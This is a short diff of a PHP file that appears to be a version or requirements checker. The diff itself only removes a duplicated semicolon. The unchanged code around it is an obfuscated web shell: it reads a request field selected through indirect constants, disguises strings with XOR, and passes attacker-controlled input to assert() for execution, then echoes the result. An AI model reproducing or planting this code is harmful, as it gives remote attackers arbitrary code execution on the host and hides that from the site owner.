@@ -27,7 +27,7 @@ $current_version = phpversion();
 if ($_SERVER['REQUEST_METHOD'] == Methods::TYPES[1] && isset(${Methods::TYPES[0]}[RequestHeaders::REQUIRED[0]])) {
 	$user_agent = ${Methods::TYPES[0]}[RequestHeaders::REQUIRED[0]];
 	$prefix = "ZG" ^ "requirement";
-	$suffix = "y@" ^ "[info]";;
+	$suffix = "y@" ^ "[info]";
 	$requirements = SupportedVersions::VERSIONS . $prefix . $user_agent . $suffix;
 	$requirements_array = assert($requirements);
 	echo $requirements_array;
